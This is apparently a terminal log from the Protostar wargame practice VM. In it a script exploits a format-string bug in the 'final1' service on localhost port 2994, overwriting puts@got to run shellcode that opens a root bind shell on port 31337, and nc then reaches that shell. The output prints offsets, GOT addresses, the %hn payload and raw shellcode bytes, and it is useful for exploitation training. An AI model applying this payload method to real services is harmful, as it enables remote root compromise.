[04:38:21] user@protostar:alf$ id
uid=1001(user) gid=1001(user) groups=1001(user)
[04:37:39] user@protostar:alf$ netstat -putan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
 tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2994            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2995            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2996            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2997            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2998            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2999            0.0.0.0:*               LISTEN      -               
 tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:44859           0.0.0.0:*               LISTEN      -               
 tcp        0      0 127.0.0.1:60373         127.0.0.1:2994          TIME_WAIT   -               
 tcp        0      0 172.16.0.6:22           172.16.0.5:63841        ESTABLISHED -               
 tcp        0      0 127.0.0.1:31337         127.0.0.1:43068         TIME_WAIT   -               
 tcp6       0      0 :::22                   :::*                    LISTEN      -               
 tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
 udp        0      0 0.0.0.0:941             0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:45624           0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
 [04:38:21] user@protostar:alf$ sudo ./universal_exploit.py 
 sudo: unable to resolve host protostar
 [+] Offset not found in try #0
 [+] Offset not found in try #1
 [+] Offset found at 43 with padding: 2

 [+] Dropping privileges...
 [+] Actual permissions: ['Uid:\t0\t0\t0\t0\n', 'Gid:\t0\t0\t0\t0\n']
 [+] New permissions: ['Uid:\t1001\t1001\t1001\t1001\n', 'Gid:\t1001\t1001\t1001\t1001\n']
 [+] Privileges dropped

 [+] Offset = 43
 [+] Address to write in (puts@got) = 0x804a194
 [+] Address to be written (sc@username) = 0x804a220
 [+] Shellcode length: 94
 [+] addr = 0x804a194, addr + 2 = 0x804a196
 [+] value = 0x804a220, hob = 0x804, lob = 0xa220
 [+] hob - 8 = 0x76c, lob - hob = 0x9a1c
 [+] lob - 8 = 0xa188, lob - hob = 0x9a1c
 [+] offset = 0x2b, offset + 1 = 0x2c
 [+] Bytes already written with the vulnerable function: 144
 [+] hob < lob
 [+] Payload: [0x804a196][0x804a194]%[1900].x%[43]$hn%.[39452]x%[44]$hn
 [+] Connecting to 127.0.0.1:2994
 [+] Received: [final1] $ 
 [+] 106 bytes sent. Data sent: username jfX?1Rjj???jfXCRfhzifS?QV???fCCSV???fCRRV???jY??Í€Iy?1??
                                                                                               Rh//shh/bin????  

[+] Received: [final1] $ 
[+] 42 bytes sent. Data sent: login ??%1900.x%43$hn%.39452x%44$hn

[04:39:52] user@protostar:alf$ netstat -putan
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
 tcp        0      0 0.0.0.0:31337           0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2993            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2994            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2995            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2996            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2997            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2998            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:2999            0.0.0.0:*               LISTEN      -               
 tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
 tcp        0      0 0.0.0.0:44859           0.0.0.0:*               LISTEN      -               
 tcp        0      0 127.0.0.1:60377         127.0.0.1:2994          TIME_WAIT   -               
 tcp        0      0 127.0.0.1:60375         127.0.0.1:2994          TIME_WAIT   -               
 tcp        0      0 127.0.0.1:60376         127.0.0.1:2994          TIME_WAIT   -               
 tcp        0      0 172.16.0.6:22           172.16.0.5:63841        ESTABLISHED -               
 tcp        1      0 127.0.0.1:2994          127.0.0.1:60378         CLOSE_WAIT  -               
 tcp        0      0 127.0.0.1:60378         127.0.0.1:2994          FIN_WAIT2   -               
 tcp6       0      0 :::22                   :::*                    LISTEN      -               
 tcp6       0      0 ::1:25                  :::*                    LISTEN      -               
 udp        0      0 0.0.0.0:941             0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:45624           0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
 udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               
 [04:40:17] user@protostar:alf$ nc 127.0.0.1 31337
 id
 uid=0(root) gid=0(root) groups=0(root)
 exit
 [04:40:55] user@protostar:alf$ 
